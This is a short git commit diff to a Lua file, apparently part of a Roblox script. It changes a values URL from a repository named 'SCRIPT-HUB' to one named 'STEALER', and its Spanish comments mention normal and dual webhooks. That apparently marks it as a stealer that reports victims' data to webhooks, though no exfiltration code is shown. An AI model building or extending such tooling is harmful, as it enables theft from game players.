6e5cd8a0ed60e6a0d5de9e7666bfbd3368f83808
Raywans <ggpapa7777@gmail.com>
2026-09-17 06:58:25 -0700

    Actualizar core.lua

--- main/core.lua
+++ main/core.lua
@@ -10,7 +10,7 @@ local player = Players.LocalPlayer
 -- ==========================================
 -- URL DE VALORES PRINCIPAL (webhook normal)
 -- ==========================================
-local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/main/utils5.json"
+local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
 
 -- ==========================================
 -- URL DE VALORES EXCLUSIVA PARA DUAL WEBHOOK
